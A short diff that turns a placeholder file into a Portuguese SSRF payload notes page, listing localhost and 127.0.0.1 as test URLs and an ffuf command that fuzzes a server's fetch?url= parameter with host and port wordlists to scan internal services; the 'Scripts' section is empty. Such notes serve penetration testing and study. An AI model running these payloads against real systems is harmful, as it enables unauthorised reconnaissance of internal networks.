@@ -1,1 +1,13 @@
-teste
+## Payloads
+### Teste Básico
+```
+http://localhost
+http://127.0.0.1
+```
+### Port Scanning
+```
+ffuf -u 'http://exemplo.com/fetch?url=HOST:PORT' -H 'Cookie: session=valor; id=valor' -w hosts.txt:HOST -w ports.txt:PORT'
+```
+### Scripts 
+
+
